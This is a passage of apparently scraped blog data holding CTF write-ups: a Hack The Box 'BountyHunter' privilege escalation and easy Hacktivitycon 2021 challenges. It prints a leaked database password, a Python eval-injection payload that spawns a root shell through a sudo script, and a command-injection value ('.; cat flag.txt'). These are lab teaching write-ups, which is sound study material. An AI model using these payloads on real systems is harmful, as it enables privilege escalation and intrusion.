http://10.10.11.100/resources (Status: 200) [Size: 2840] http://10.10.11.100/assets (Status: 403) [Size: 277] http://10.10.11.100/css (Status: 403) [Size: 277] http://10.10.11.100/js (Status: 403) [Size: 277] ...  It ran quite fast at the start, and quite a lot of errors at the end. But after all, it revealed a /db.php file, which sounds really exciting   And finally, it returned some very useful stuffs.  \u0026lt;?php // TODO -\u0026gt; Implement login system with the database. $dbserver = \u0026#34;localhost\u0026#34;; $dbname = \u0026#34;bounty\u0026#34;; $dbusername = \u0026#34;admin\u0026#34;; $dbpassword = \u0026#34;m19RoAU0hP41A1sTsq6K\u0026#34;; $testuser = \u0026#34;test\u0026#34;; ?\u0026gt; Getting a database\u0026rsquo;s credentials but cannot logging in is like having your room\u0026rsquo;s key but the house key is nowhere to be found - not that much of use I tried with some combinations from those credentials on SSH, but seems like none of that was correct A certain passwd user list that I got from XXE earlier flashed through my mind, so I tried my luck  âââ(akiã¿kali)-[~/ctf/htb/BountyHunter] ââ$ grep home passwd.txt syslog:x:104:110::/home/syslog:/usr/sbin/nologin development:x:1000:1000:Development:/home/development:/bin/bash  That development user looks interesting, so I tried it with the database credentials   And we got it! The user flag!   II. Privilege escalation  5 seconds in and I\u0026rsquo;d already known what I was going to do:  development@bountyhunter:~$ sudo -l Matching Defaults entries for development on bountyhunter: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User development may run the following commands on bountyhunter: (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py  Okay so we could run that ticketValidator.py file as root, and\u0026hellip;  development@bountyhunter:~$ ls -l /opt/skytrain_inc/ticketValidator.py -r-xr--r-- 1 root root 1471 Jul 22 11:08 /opt/skytrain_inc/ticketValidator.py  It didn\u0026rsquo;t looks like we can modify that file anyway. So let\u0026rsquo;s cat it out and see what\u0026rsquo;s what.  development@bountyhunter:~$ cat /opt/skytrain_inc/ticketValidator.py #Skytrain Inc Ticket Validation System 0.1 #Do not distribute this file. def load_file(loc): if loc.endswith(\u0026#34;.md\u0026#34;): return open(loc, \u0026#39;r\u0026#39;) else: print(\u0026#34;Wrong file type.\u0026#34;) exit() def evaluate(ticketFile): #Evaluates a ticket to check for ireggularities. code_line = None for i,x in enumerate(ticketFile.readlines()): if i == 0: if not x.startswith(\u0026#34;# Skytrain Inc\u0026#34;): return False continue if i == 1: if not x.startswith(\u0026#34;## Ticket to \u0026#34;): return False print(f\u0026#34;Destination: {\u0026#39; \u0026#39;.join(x.strip().split(\u0026#39; \u0026#39;)[3:])}\u0026#34;) continue if x.startswith(\u0026#34;__Ticket Code:__\u0026#34;): code_line = i+1 continue if code_line and i == code_line: if not x.startswith(\u0026#34;**\u0026#34;): return False ticketCode = x.replace(\u0026#34;**\u0026#34;, \u0026#34;\u0026#34;).split(\u0026#34;+\u0026#34;)[0] if int(ticketCode) % 7 == 4: validationNumber = eval(x.replace(\u0026#34;**\u0026#34;, \u0026#34;\u0026#34;)) if validationNumber \u0026gt; 100: return True else: return False return False def main(): fileName = input(\u0026#34;Please enter the path to the ticket file.\\n\u0026#34;) ticket = load_file(fileName) #DEBUG print(ticket) result = evaluate(ticket) if (result): print(\u0026#34;Valid ticket.\u0026#34;) else: print(\u0026#34;Invalid ticket.\u0026#34;) ticket.close main()  Before breaking something, we\u0026rsquo;ve to understand how it works first. So I wrote a perfectly valid \u0026ldquo;ticket\u0026rdquo; for the script:  # Skytrain Inc ## Ticket to BountyHunter and friends __Ticket Code:__ **11+90  And it worked as it should:  development@bountyhunter:~$ sudo -u root /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py Please enter the path to the ticket file. /home/development/ticket.md Destination: BountyHunter and friends Valid ticket.  Now the real question is - how to exploit this \u0026ldquo;ticket\u0026rdquo; function The only line that caught my attention was this particular line:  validationNumber = eval(x.replace(\u0026#34;**\u0026#34;, \u0026#34;\u0026#34;)) Yes, that eval.\n As far as I knew, eval can only be used with Python\u0026rsquo;s expressions, not statements. But a little bit of experience in Python can lead you to this:  \u0026gt;\u0026gt;\u0026gt; eval(exec(\u0026#34;import pty; pty.spawn(\u0026#39;/bin/bash\u0026#39;)\u0026#34;)) âââ(akiã¿kali)-[~] ââ$  The only obstacle in our way was this 2 lines:  ticketCode = x.replace(\u0026#34;**\u0026#34;, \u0026#34;\u0026#34;).split(\u0026#34;+\u0026#34;)[0] if int(ticketCode) % 7 == 4:  Basically, before we could get our sweet reverse shell, we need to bypass this check first Of those 2 lines, the first one defined a ticketCode variable which is equal to the first part of our payload, before the first \u0026ldquo;+\u0026rdquo; sign, excluding all \u0026ldquo;**\u0026rdquo;. If we just insert our payload there, it wouldn\u0026rsquo;t be able to be converted to int type and therefore, that eval statement would be ignored However, exec in Python3 actually does return something. So I tried this:  \u0026gt;\u0026gt;\u0026gt; eval(11+exec(\u0026#34;import pty; pty.spawn(\u0026#39;/bin/bash\u0026#39;)\u0026#34;)) âââ(akiã¿kali)-[~] ââ$ perfect. \u0026lsquo;^\u0026rsquo;\n So our full payload was:  # Skytrain Inc ## Ticket to BountyHunter and friends __Ticket Code:__ **11+exec(\u0026quot;import pty; pty.spawn('/bin/bash')\u0026quot;)  Let\u0026rsquo;s try out if it worked  development@bountyhunter:~$ sudo -u root /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py Please enter the path to the ticket file. /home/development/ticket.md Destination: BountyHunter and friends root@bountyhunter:/home/development# whoami root  And that\u0026rsquo;s it, a great challenge to learn about XXE.  ","permalink":"https://git-akihakune.github.io/blog/bountyhunter/","summary":"Writeup for Bounty Hunter box on Hack The Box","title":"Hack The Box - Bounty Hunter writeup"},{"content":"Warmups - Tsunami Downloading the file and running file command, we get its file type - an audio file.\nLet\u0026rsquo;s think simple, and straight up open it in an audio editor - here I choose the open-source Audacity.\nAnd that\u0026rsquo;s it, we got the flag!\nWarmups - Pimple Follow the exact same procedure as Tsunami, we have:\nOkay so what\u0026rsquo;s a GIMP XCF image? A quick Google search led me to some interesting information, including the official documentation. Following this great article, I tried to use an online converter but it did not seems to work\u0026hellip;\nSo let\u0026rsquo;s check GIMP package size, power off our attack machine, take a snapshot, then power it on again and sudo apt install gimp.\nRenaming the file to pimple.xcf and open it in GIMP, we got the flag.\n\u0026hellip; Those morose eyes were exactly like mine when I worked on some challenges.\nWarmups - Bass64 Oh, once again, hello John. This challenge here is pretty straight-forward. Download the file, open it, then resize our editor window to a suitable dimension, we have\nDirectly base64 decoding it, we instantly got the flag.\nWarmups - Read The Rules As they said, please be a civilized player and read the rules. The flag\u0026rsquo;s in the source code.\nWarmups - 2EZ Another challenge from John. Let\u0026rsquo;s follow our procedure from previous challenges.\nSeems like our file command did not have much use here. Let\u0026rsquo;s try strings.\nJFIF\u0026hellip; so it should be an image file. Renaming its extension to jpg or gif didn\u0026rsquo;t solve anything, and file command\u0026rsquo;s magic also didn\u0026rsquo;t recognize the file\u0026rsquo;s type. So its file signature must be wrong.\nOpen it up in a hex editor, we can clearly see our guess was right.\nSo we change the first 4 bytes accordingly to JFIF file signature and we got the flag!\nWeb - Swaggy Following the url, we got to a pretty clean website.\nMessing around a bit, we knew that this site use the GUI to make curl GET request to an API endpoint. Execute sent a HTTP GET request to the endpoint, but it required basic authentication, encoded in base64. I tried with \u0026lsquo;user:password\u0026rsquo; but it returned 403: Invalid credentials. So, I tried another default creadential - \u0026lsquo;admin:admin\u0026rsquo;. And to my surprise - it returned the flag quite easily. Web - Titanic Following the url, we got to a website with pretty decent UI. On a side note, you should really press that \u0026lsquo;Watch Video\u0026rsquo; button, quite informative.\nRight at the top of nav bar, we got the admin panel.\nI tried some common credentials, as well as checking the source code and requests, but nothing particularly interesting found, except that it used GET for authentication, which\u0026rsquo;s specially unrecommendable. So I returned to the home page and it led me to another engrossing service.\nI tried with https://google.com and it returned something like a screenshot image of Google. A flashback of HTB\u0026rsquo;s Love box, and I tried if it could also take a capture of local network sites. So it got me a glimpse on a loading page, which\u0026rsquo;s not much of use in this case. I checked Wappalyzer and found out that the server ran on Apache. A quick Google search revealed that Apache servers have a default server-status site which can be useful for log checking.\nAnd it actually did! Based on the requests' parameters, we got an user\u0026rsquo;s credential. Logging in that account, we got the flag.\nWeb - Confidentiality Another John Hammond\u0026rsquo;s challenge it seems.\nSo I just followed the placeholder and it gave me something that looks like a ls -l result.\nLooks like this site just run whatever command we want in a bash, provided that it starts with ls -l. So here comes the payload.\nAnd that\u0026rsquo;s it, we got the flag. You can also use .; cat flag.txt if you like.\n","permalink":"https://git-akihakune.github.io/blog/hacktivitycon/","summary":"Writeups for some easy challenges in hacktivitycon 2021","title":"Easy Hacktivitycon Challenges writeup"}]